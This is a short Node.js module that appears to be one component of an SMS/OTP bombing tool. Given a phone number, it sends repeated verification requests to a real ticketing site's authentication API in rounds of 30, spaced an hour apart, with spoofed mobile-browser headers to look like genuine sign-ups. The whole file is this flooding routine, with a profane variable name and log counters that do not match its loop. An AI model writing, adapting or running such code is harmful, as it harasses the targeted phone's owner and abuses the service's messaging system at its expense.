const axios = require("axios");

async function bdticket(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const fuck = await axios.options('https://api.bdtickets.com:20100/v1/auth', {
  headers: {
    'authority': 'api.bdtickets.com:20100',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'access-control-request-headers': 'content-type',
    'access-control-request-method': 'POST',
    'origin': 'https://bdtickets.com',
    'referer': 'https://bdtickets.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
  }
});
        console.log(fuck.data)
        const response = await axios.post(
  'https://api.bdtickets.com:20100/v1/auth',
  {
    'createUserCheck': true,
    'phoneNumber': `+88${number}`,
    'applicationChannel': 'WEB_APP'
  },
  {
    headers: {
      'authority': 'api.bdtickets.com:20100',
      'accept-language': 'en-US,en;q=0.9',
      'origin': 'https://bdtickets.com',
      'referer': 'https://bdtickets.com/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] bdticket Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] bdticket Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { bdticket };
